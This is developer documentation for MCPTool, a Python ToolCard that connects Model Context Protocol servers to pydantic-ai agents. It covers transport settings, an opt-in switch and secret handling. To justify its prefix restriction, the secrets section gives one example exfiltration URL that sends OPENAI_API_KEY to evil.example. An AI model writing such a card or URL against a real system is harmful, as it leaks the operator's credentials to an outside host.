# MCPTool

Integrates an external [Model Context Protocol](https://modelcontextprotocol.io) server as a
native pydantic-ai toolset, over `streamable-http`, `sse` or `stdio`.

```python
from akgentic.tool.mcp import MCPTool, MCPHTTPConnectionConfig, MCPStdioConnectionConfig
```

| | |
|---|---|
| Module | `akgentic.tool.mcp.mcp` |
| Actor | none |
| Channels used | **none** — capabilities arrive through `get_toolsets()`, not `get_tools()` |
| Dependency | `pydantic-ai` (a base dependency); `mcp` and `fastmcp` arrive with it |

---

## The ToolCard

```python
class MCPTool(ToolCard):
    connection: MCPConnectionConfig      # required, singular
```

**One card, one server.** `connection` is required and singular; two MCP servers means two cards.
`MCPConnectionConfig` is the union `MCPHTTPConnectionConfig | MCPStdioConnectionConfig`, so the
transport family is chosen by which model you construct.

**`get_tools()` is always empty.** MCP tools are not Python callables the factory can enumerate —
their schemas live on the server. `get_toolsets()` returns a single `MCPToolset` built over a
fastmcp transport, and pydantic-ai handles discovery, schema resolution and dispatch. A card that
returns only toolsets is a first-class shape: `ToolFactory.get_toolsets()` aggregates them
alongside the callables from every other card.

---

## `MCPHTTPConnectionConfig` — remote servers

| Field | Type | Default | Meaning |
|---|---|---|---|
| `url` | `str` | **required** | The MCP endpoint URL. `${VAR}` is resolved — see [below](#secrets-come-from-the-worker-environment). |
| `transport` | `"streamable-http" \| "sse"` | `"streamable-http"` | Chosen explicitly — see [below](#the-transport-is-never-inferred). |
| `bearer_token` | `str \| None` | `None` | `${VAR}` is resolved. Sent as `Authorization: Bearer …` **on the transport**, never as a toolset `headers=` kwarg (pydantic-ai raises `ValueError` when both a transport object and headers are given). |
| `timeout` | `float` (>0) | `10.0` | Connection **initialization** timeout. Translated to pydantic-ai's `init_timeout` when the toolset is built; the field is deliberately not renamed because it is persisted in catalog entries. |
| `read_timeout` | `float` (>0) | `300.0` | Read timeout for the transport. For `sse` it is also forwarded as `sse_read_timeout` — see [below](#sse-needs-read_timeout-twice). |
| `tool_prefix` | `str \| None` | `None` | Prefix applied to every tool name via the toolset's `prefixed()` wrapper. |

## `MCPStdioConnectionConfig` — local subprocess servers

| Field | Type | Default | Meaning |
|---|---|---|---|
| `transport` | `Literal["stdio"]` | `"stdio"` | Fixed; it is the discriminator. |
| `stdio_command` | `str \| None` | `None` | The launcher — `uvx`, `npx`, `docker`, a binary path. **Required in practice:** a missing value raises `ValueError` when the toolset is built. |
| `stdio_args` | `list[str]` | `[]` | Arguments passed to the command. `${VAR}` is resolved in each. |
| `stdio_env` | `dict[str, str] \| None` | `None` | Environment for the subprocess. `${VAR}` is resolved in each value (not in keys). |
| `stdio_cwd` | `str \| None` | `None` | Working directory for the subprocess. |
| `stdio_token_env_var` | `str \| None` | `None` | When set together with `bearer_token`, the token is injected into the subprocess environment under this name. |
| `bearer_token` | `str \| None` | `None` | `${VAR}` is resolved. Only reaches the server through `stdio_token_env_var` — there is no header on a stdio transport. |
| `timeout` | `float` (>0) | `10.0` | Initialization timeout ⇒ `init_timeout`. |
| `read_timeout` | `float` (>0) | `300.0` | Read timeout. |
| `tool_prefix` | `str \| None` | `None` | As above. |

---

## MCP is off unless the worker turns it on

An MCP card is code execution on the worker: a stdio card launches any command, and an HTTP card
sends whatever it can read to any host. Whoever can write an MCP card therefore controls the
worker. `MCPTool` refuses to build — `get_toolsets()`, `list_mcp_tools()` and
`probe_mcp_connection()` all raise `PermissionError` — unless the worker exports:

```bash
AKGENTIC_MCP_ENABLED=true   # also 1 or yes, any case; anything else is off
```

The switch is read from the worker's environment, never from the card, so a card author cannot
turn it on. Enable it only where writing tool cards is restricted to administrators. The constant
is exported as `akgentic.tool.mcp.MCP_ENABLED_ENV`.

## Secrets come from the worker environment

Never write a credential into a card. Write a `${VAR}` placeholder and export `VAR` on the worker,
**named with the prefix `AKGENTIC_MCP_SECRET_`**:

```yaml
connection:
  transport: stdio
  stdio_command: uvx
  stdio_args: ["acme-mcp-server"]
  stdio_env:
    CLIENT_SECRET: "${AKGENTIC_MCP_SECRET_ACME_CLIENT}"
```

- **Only the prefix is readable.** `${OPENAI_API_KEY}`, `${HOME}` or any other name raises
  `ValueError`, even when the variable is set. Otherwise a card could send any worker secret to a
  host it names (`url: https://evil.example/?k=${OPENAI_API_KEY}`). Exporting a value under
  `AKGENTIC_MCP_SECRET_` is the operator's decision to expose it to MCP cards. The constant is
  exported as `akgentic.tool.mcp.MCP_SECRET_PREFIX`.
- **Resolved fields:** `url`, `bearer_token`, `stdio_args`, and `stdio_env` *values*. Not
  `stdio_command`, `stdio_cwd`, `stdio_token_env_var`, `tool_prefix`, or `stdio_env` keys.
- **When:** each time the transport is built, from that process's `os.environ`.
- **Never persisted:** the resolved value lives only in the transport. The card keeps the
  placeholder, so team cards, the event store and catalog exports never carry the secret.
- **Missing is an error:** an unset *or empty* variable raises `ValueError` naming the variable
  (never a value) when the toolset is built, instead of reaching the server as a blank credential.
- **Why stdio needs `stdio_env`:** the MCP SDK hands a stdio server only `HOME, LOGNAME, PATH,
  SHELL, TERM, USER`. Exporting the secret on the worker is not enough on its own; `stdio_env` is
  the only route into the subprocess.
- **Prefer `bearer_token` and `stdio_env`.** A secret resolved into `url` travels in the request
  line: httpx logs request URLs at `INFO`, and its HTTP error messages quote the URL. A secret
  resolved into `stdio_args` is visible to any user on the host in the process list. Use those
  two fields only for a value the server accepts nowhere else.
- There is no escape syntax: a literal `${NAME}` in a resolved field cannot be sent as-is.
- **What the prefix does not stop:** a card author can still send an `AKGENTIC_MCP_SECRET_*`
  value to a host of their choosing, and a stdio card can still run any command. The switch above,
  and who may write cards, is the real boundary.

---

## Three things the transport layer gets right, and why

### The transport is never inferred

pydantic-ai infers SSE only from URLs ending in `/sse`. An SSE endpoint published on any other
path would be silently downgraded to streamable HTTP. This package therefore always constructs
the transport object explicitly from `transport`, so `transport="sse"` is honoured whatever the
URL looks like. A `/sse` suffix is **not** a substitute for setting the field.

### SSE needs `read_timeout` twice

For SSE, `read_timeout` is forwarded to the transport as `sse_read_timeout` as well. That is the
only route to the long-lived event stream: the toolset's own `read_timeout` reaches just the
per-request session timeout, and pydantic-ai's transport builder — which would otherwise set the
stream timeout — returns early when handed a pre-built transport, as it is here. Left unset,
fastmcp omits the kwarg and `mcp.client.sse`'s 5-minute default silently overrides the configured
value.

The streamable-HTTP branch deliberately gets nothing: upstream deprecates `sse_read_timeout`
there and derives the timeout from the session's `read_timeout_seconds`, which the toolset already
supplies.

### MCP tool calls inherit the agent's retry budget

The retired v1 server classes hard-defaulted `max_retries=1`. `MCPToolset` defaults it to `None`
and falls back to `ctx.max_retries`, so MCP tool calls now inherit `Agent(retries=…)` — reached
from `ReactAgentConfig.runtime_cfg.retries` — instead of always being capped at one. This is
deliberate: the connection configs are catalog-persisted, and adding a field to carry the old
constant would change their stored shape for a value the agent already owns.

---

## Configuration

### Remote, streamable HTTP (the default)

```python
MCPTool(
    connection=MCPHTTPConnectionConfig(
        url="https://mcp.acme.example/api/v1/endpoint",
    )
)
```

### Remote, SSE

```python
MCPTool(
    connection=MCPHTTPConnectionConfig(
        url="https://mcp.acme.example/api/v1/endpoint",
        transport="sse",              # required — a /sse suffix is not enough
        bearer_token="...",
        read_timeout=900.0,           # also governs event-stream silence tolerance
    )
)
```

### Local subprocess

```python
MCPTool(
    connection=MCPStdioConnectionConfig(
        stdio_command="uvx",
        stdio_args=["acme-mcp-server"],
        tool_prefix="acme",           # applied via the toolset's prefixed() wrapper
    )
)
```

Every stdio option together, including a token delivered through the subprocess environment
(there is no header on a stdio transport):

```python
MCPTool(
    connection=MCPStdioConnectionConfig(
        stdio_command="uvx",
        stdio_args=["acme-mcp-server"],
        stdio_env={"ACME_REGION": "eu"},
        stdio_cwd="/srv/acme",
        stdio_token_env_var="ACME_TOKEN",
        bearer_token="...",           # injected as ACME_TOKEN in the subprocess
        tool_prefix="acme",
    )
)
```

### Name collisions

Two servers exposing a `search` tool collide in the agent's tool namespace. `tool_prefix` is the
fix — it wraps the toolset in a `PrefixedToolset`, so `search` becomes `acme_search`:

```python
ToolFactory([
    MCPTool(connection=MCPStdioConnectionConfig(stdio_command="uvx",
                                                stdio_args=["acme-mcp"], tool_prefix="acme")),
    MCPTool(connection=MCPHTTPConnectionConfig(url="https://mcp.contoso.example/",
                                               tool_prefix="contoso")),
], observer=agent)
```

---

## Diagnostics

```python
from akgentic.tool.mcp import list_mcp_tools, probe_mcp_connection

names = await list_mcp_tools(connection)
# ['search', 'fetch', ...] — as the server reports them, without tool_prefix applied

summary = await probe_mcp_connection(connection, max_tools_to_print=20)
# {'tool_count': 12, 'tools': [...], 'feasible': True}
```

Both build the **bare** toolset rather than going through `MCPTool.get_toolsets()`: a prefixed
toolset is a wrapper with no `list_tools()` and no attribute proxy, so diagnostics would break for
exactly the configurations that set a `tool_prefix`.

`MCPDiagnosticsConfig` carries a single field, `max_tools_to_print: int = 20` (≥1), matching
`probe_mcp_connection`'s keyword.

---

## OAuth

For servers that answer `401` with an MCP `WWW-Authenticate` challenge, `oauth_handler.py` runs a
browser-based authorization flow:

```python
from akgentic.tool.mcp import (
    get_mcp_token_with_oauth_if_needed,
    handle_mcp_oauth_flow,
    parse_www_authenticate_header,
    probe_mcp_with_oauth,
)
```

> **The flow stops at the authorization code.** Exchanging that code for an access token is not
> implemented, so the returned value is the **code itself**, not a bearer token. The helpers are
> also not wired into `MCPTool` — call them yourself and pass the result as `bearer_token` once
> you have completed the exchange.

---

## Failure modes worth knowing

- A `stdio` connection with no `stdio_command` raises `ValueError` when the toolset is built.
- With `AKGENTIC_MCP_ENABLED` unset or not truthy, every build raises `PermissionError`.
- A `${VAR}` outside `AKGENTIC_MCP_SECRET_*`, or whose variable is unset or empty, raises
  `ValueError` naming it when the toolset is built.
- The `MCPToolset` import is deliberately **not** wrapped in a try/except: `mcp` ships
  unconditionally with pydantic-ai, so a genuine `ImportError` surfaces with its real cause
  instead of being rewritten into misleading installation advice.
- `MCPTool` performs no wiring in `observer()` and needs no orchestrator — it is the only tool
  card in the package that is inert until the agent runs.

---

See the [package README](../../../../README.md) for the `ToolCard` / `ToolFactory` machinery and
how toolsets are aggregated alongside callables.
